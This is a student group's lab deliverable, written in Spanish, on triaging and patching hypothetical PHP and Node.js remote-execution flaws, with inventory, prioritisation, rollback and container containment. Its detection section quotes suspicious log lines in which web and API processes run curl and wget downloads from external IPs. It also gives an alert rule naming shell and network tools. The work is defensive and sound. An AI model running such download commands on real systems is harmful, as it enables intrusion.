# Entregable — TP PHP2Shell / Node2Shell

**Grupo:** 12 · **Fork del grupo:** https://github.com/SerraFacundo/goys-2026-tp-vulnerabilidades · **Rama:** `grupo-12`
**Fecha:** jueves 29/10/2026

| Integrante | Usuario de GitHub | Rol en el TP |
|---|---|---|
| Facundo Serra | `SerraFacundo` | Fork, colaboradores, script para Podman |
| Martin Espamer | `MartinEspamer` | Corrida del lab: inventario, parche y contención |
| Manuel Rebol | `ManuelRebol` | Detección (audit.log) |
| Agustín Manrique | `AgustinManrique` | Priorización |
| Baltazar Molteni | `BaltazarMolteni` | Comunicación / comité |

El lab lo corrimos en una PC con Linux, Docker 29.8.0 y Compose v5.5.1, el 29/10 de
00:55 a 01:00 UTC. Las salidas de los comandos están en la carpeta [`capturas/`](capturas/).

---

## 1. Inventario

| Activo | Versión | ¿Expuesto a Internet? | ¿Procesa contenido no confiable? | ¿Afectado? | Evidencia |
|--------|---------|:---------------------:|:--------------------------------:|:----------:|-----------|
| Portal PHP | PHP 8.3.35, Apache con mod_php (SAPI `apache2handler`), `session.upload_progress.enabled=1` | En el lab no. En el caso real sí | Sí, recibe formularios y archivos de usuarios | Sí, PHP2Shell. Se corrige en 8.3.36 | [01](capturas/01-arranque-inventario-vulnerable.txt), [02](capturas/02-evidencia-exposicion.txt) |
| API Node.js | Node v22.23.3, Express 5.3.0, Brotli 1.1.0 (viene con Node) | En el lab no. En el caso real sí | Sí, `POST /decode` recibe datos de clientes | Sí, Node2Shell. Se corrige en Node 22.23.4 | [01](capturas/01-arranque-inventario-vulnerable.txt), [02](capturas/02-evidencia-exposicion.txt), [10](capturas/10-hallazgos-extra.txt) |
| Servicio Python | Python 3.11.18, brotli 1.0.9 | No, es interno | Más o menos: solo recibe datos de otros servicios internos | Sí, brotli 1.0.9 está en el rango afectado (1.0.3 a 1.2.0). Se corrige en 1.2.1 | [01](capturas/01-arranque-inventario-vulnerable.txt), [02](capturas/02-evidencia-exposicion.txt) |

En el lab ningún contenedor publica puertos (`docker port` no devuelve nada) y la red
`labnet` es interna. O sea que en el lab nada se puede alcanzar desde Internet.

**Supuestos de exposición:**

- El portal PHP está publicado en Internet atrás de un proxy. PHP2Shell no depende de
  la aplicación, así que con tener PHP vulnerable alcanza.
- La API Node también está publicada y el proxy deja pasar el header
  `Content-Encoding: br`. Esto no lo pudimos probar porque en el lab no hay proxy.
- El servicio Python solo lo usan otros servicios internos.

**Dos cosas que vimos en Node:**

- No hay ningún paquete `brotli` instalado (`npm ls` no lo muestra). Brotli viene
  dentro de Node y Express 5 lo usa solo para descomprimir el body cuando llega
  `Content-Encoding: br`. El código de la API no tiene que llamar a Brotli para
  quedar expuesto.
- `process.versions.brotli` dice 1.1.0 antes y después del parche. Por eso para Node
  hay que mirar la versión de Node y no la de Brotli.

---

## 2. Priorización y decisión

| Activo | CVSS | Explotación real | Exposición | Criticidad | Decisión y plazo |
|--------|:----:|:----------------:|:----------:|:----------:|------------------|
| Portal PHP | 9.2 | Sí, está en CISA KEV desde el 26/10 | Internet | Alta (datos de empleados) | Mitigar ya (menos de 2 h) y parchear a 8.3.36 en menos de 24 h |
| API Node.js | 9.2 (Node.js la pone como High) | No confirmada al 27/10, solo en laboratorio | Internet | Media-alta | Parchear a 22.23.4 en menos de 72 h. Mientras, bloquear `Content-Encoding: br` en el proxy donde no se use |
| Servicio Python | 9.2 | No confirmada | Red interna | Media | Parchear a brotli 1.2.1 en la próxima ventana, menos de 7 días |

**Justificación:** los tres tienen CVSS 9.2, así que el CVSS no sirve para ordenar.
Ordenamos por explotación real y exposición. PHP va primero porque ya se está
explotando y está en Internet. Node va segundo porque está expuesto pero no hay
ataques confirmados. Python va último porque es interno y para llegar hace falta
entrar antes por otro lado.

**Qué nos haría cambiar el orden:**

- Si Node2Shell entra en KEV o sale un exploit público, Node pasa a ser igual de
  urgente que PHP.
- Si el portal PHP en realidad solo se accede por VPN, baja a 72 h (con la mitigación
  puesta).
- Si encontramos que alguien ya entró a la red interna, Python sube.

En el lab parcheamos los tres juntos porque era el mismo comando.

---

## 3. Mitigación, parche y reversión

| Fecha/hora (UTC) | Activo | Cambio | Antes | Después | Reversión |
|------------|--------|--------|-------|---------|-----------|
| 29/10 00:57 | Portal PHP | Mitigación: en `php/php.ini` pusimos `session.upload_progress.enabled = 0` y `docker compose restart php-lab` | 1 | 0, contenedor healthy | Volver a 1 y reiniciar |
| 29/10 00:57 | Portal PHP | Parche con `./scripts/parchear.sh` | PHP 8.3.35 (imagen `c59c808172ee`) | PHP 8.3.36, la mitigación sigue en 0 | `docker compose --env-file versions.env up -d --wait` |
| 29/10 00:57 | API Node.js | Parche (mismo script) | Node v22.23.3 (imagen `4764056f6204`) | Node v22.23.4 | Mismo comando |
| 29/10 00:57 | Servicio Python | Parche (mismo script) | brotli 1.0.9 (imagen `5366489a7f48`) | brotli 1.2.1 | Mismo comando |
| 29/10 00:58 | Los tres | Probamos la reversión | 8.3.36 / 22.23.4 / 1.2.1 | 8.3.35 / 22.23.3 / 1.0.9, todo healthy | |
| 29/10 00:58 | Los tres | Volvimos a parchear (estado final) | 8.3.35 / 22.23.3 / 1.0.9 | 8.3.36 / 22.23.4 / 1.2.1, todo healthy | |

Salidas: [06](capturas/06-mitigacion-php.txt) mitigación, [07](capturas/07-parche.txt)
parche, [08](capturas/08-verificacion-y-reversion.txt) prueba funcional y reversión.

La reversión tardó unos 17 segundos porque las imágenes viejas seguían en la máquina.
En un caso real hay que asegurarse antes de que la imagen anterior esté guardada,
si no, para volver atrás hay que bajarla de nuevo.

**Prueba funcional mínima:**

- PHP: `GET /` devuelve 200 con "Portal de legajos". Subir un archivo devuelve
  "Archivo recibido: legajo.txt".
- Node: `POST /decode` con texto devuelve 200.
- Python: `POST /` con un body comprimido en Brotli devuelve 200 y el texto original.
- Los healthchecks de los tres quedan en healthy.

**Qué no se pudo probar:**

- Que el parche realmente cierre la vulnerabilidad. No corrimos ningún exploit
  (está prohibido), así que lo suponemos por la versión instalada.
- Que la mitigación de PHP frene el ataque. Solo vimos que el valor quedó en 0.
- Cómo se comporta un proxy con `Content-Encoding: br`, porque no hay proxy en el lab.
- Además encontramos que `POST /decode` con un Brotli válido devuelve 400. Express ya
  lo descomprimió y después el código intenta descomprimirlo otra vez. Pasa antes y
  después del parche ([10](capturas/10-hallazgos-extra.txt)). No es de seguridad, pero
  muestra que Brotli se usa aunque el código no lo pida.

---

## 4. Detección y caza

El detalle está en [`deteccion.md`](deteccion.md).

**Hipótesis:** si alguien explotó PHP o Node, deberíamos ver al proceso del servicio
(`apache2`, `node`, `python`) lanzando `sh`, `bash`, `curl` o `wget` después del 21/10.

**Hallazgos en `audit.log`:**

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|-------------------|------|--------------|:---------:|---------|
| 6-7, 09:42:17 | web01 | `apache2` → `sh -c id` | Sí | Apache no tiene por qué lanzar un shell. `id` es lo primero que se corre para ver qué usuario se tiene |
| 9-10, 09:43:03 | api01 | `node` → `sh -c curl http://198.51.100.7/x` | Sí | La API no ejecuta comandos. Intenta bajar algo de una IP externa |
| 14, 09:44:22 | web01 | `apache2` → `wget http://198.51.100.9/a` | Sí | Otra descarga desde el servidor web |
| 16-17, 09:45:10 | svc01 | `python` → `sh -c uname -a` | Sí | El servicio interno no lanza shells. `uname -a` es reconocimiento |
| 8, 13, 21 | db01 | `sshd` → `bash` | Dudoso | Puede ser un admin entrando por SSH |

**¿Hay compromiso?** Probablemente sí en web01 y api01. En svc01 no se puede saber.
Son cuatro casos raros en 3 minutos en tres servidores. No es seguro porque el log no
tiene usuario ni IP de origen y no sabemos si las descargas funcionaron.

**Regla para Node.js:** alertar si `ppid_comm=node` y `comm` es `sh`, `bash`, `curl`,
`wget` o `nc`. No detecta si el atacante hace todo desde adentro de Node (por ejemplo
con `fetch`) sin lanzar otro proceso.

**Limitaciones del log:** no tiene usuario, IP de origen, código de salida ni tráfico
de red, y cubre solo 9 minutos.

---

## 5. Contención

Lo probamos en los tres contenedores antes y después del parche
([03](capturas/03-contencion.txt), [05](capturas/05-controles-detalle.txt),
[09](capturas/09-contencion-post-parche.txt), [10](capturas/10-hallazgos-extra.txt)).

| Control | Configuración | Evidencia | ¿Funciona? |
|---------|---------------|-----------|:----------:|
| Red sin salida | `internal: true` | Los tres dan `SIN SALIDA` al intentar conectarse a example.com | Sí |
| Usuario sin privilegios | `user: node`, `user: nobody`. Apache arranca como root y atiende con `www-data` | `id` da `uid=1000(node)` y `uid=65534(nobody)`. `docker top` muestra los workers como `www-data` | Sí (en PHP parcial) |
| Filesystem read-only | `read_only: true` y `tmpfs` en `/tmp` | `touch /prueba-ro` da `Read-only file system` en los tres. `/tmp` se puede escribir pero tiene `noexec` | Sí |
| Capabilities mínimas | `cap_drop: ALL` y `no-new-privileges` | Node y Python tienen `CapEff=0`. PHP conserva 5 (CHOWN, DAC_OVERRIDE, SETGID, SETUID, NET_BIND_SERVICE) | Sí |
| Límites de memoria/PIDs | `mem_limit` y `pids_limit` | `docker inspect`: 256 MB y 100 PIDs en PHP y Node, 128 MB y 50 PIDs en Python | Configurado, no lo probamos con carga |
| Rechazo de Brotli innecesario | No está configurado | Express descomprime `br` antes de llegar al código | No |

**Qué daño evita cada uno:**

- Red sin salida: que el atacante baje herramientas o saque datos. Las descargas con
  `curl` y `wget` del log habrían fallado.
- Usuario sin privilegios: que el código del atacante corra como root.
- Read-only: que deje archivos (por ejemplo un webshell) o cambie programas. En `/tmp`
  puede escribir pero no ejecutar.
- Capabilities: que use permisos especiales del kernel para escalar o salir del
  contenedor.
- Límites: que tire el servidor llenando la memoria o creando procesos sin fin.

**Prueba de salida a Internet:** falla en los tres, antes y después del parche.

**Lo que sigue quedando (riesgo residual):**

- En PHP el proceso principal de Apache sigue como root con 5 capabilities.
- El usuario `node` del contenedor tiene UID 1000, que en la máquina donde corrimos el
  lab es un usuario real (`docker top` lo muestra como `martin`). Si alguien sale del
  contenedor queda con ese usuario.
- Cuando Express falla devuelve el error interno de Node al cliente.

**Controles que agregaríamos:**

1. Bloquear `Content-Encoding: br` en el proxy menos en `/decode`, y usar
   `express.raw({ inflate: false })` donde no haga falta. Así no se llega al decoder
   vulnerable hasta tener el parche.
2. Activar `userns-remap` o Docker rootless, para que salir del contenedor no te deje
   como un usuario real.
3. Pasar PHP a PHP-FPM o Apache en un puerto alto, para sacarle capabilities.

---

## 6. Conclusión (5 líneas)

En las primeras 2 horas pondríamos primero la mitigación de PHP, que es rápida y se
puede deshacer, y después ordenaríamos el resto según KEV y exposición, no solo por CVSS.
Revisaríamos versiones de Node y PHP directamente y no por la lista de dependencias,
porque Brotli no aparece como paquete y su versión no cambia con el parche.
Antes de parchear confirmaríamos que tenemos la versión anterior para volver atrás.
Y empezaríamos a revisar los logs enseguida, porque el parche no saca a alguien que ya entró.

---

## 7. Checklist antes de entregar

- [x] El laboratorio arrancó y los 3 servicios quedaron `healthy`.
- [x] Inventario con evidencia (versión, SAPI, configuración).
- [x] Matriz con decisión y plazo.
- [x] Parche aplicado y verificado; reversión documentada y probada.
- [x] Al menos 3 controles de contención probados.
- [x] `deteccion.md` completo.
- [ ] Informes individuales completos (`informe-apellido.md`, uno por integrante).
- [ ] Sin claves, tokens ni placeholders.
- [ ] Repo pusheado y PR abierto.

Checklist completa: [`../../docs/checklist-entrega.md`](../../docs/checklist-entrega.md).
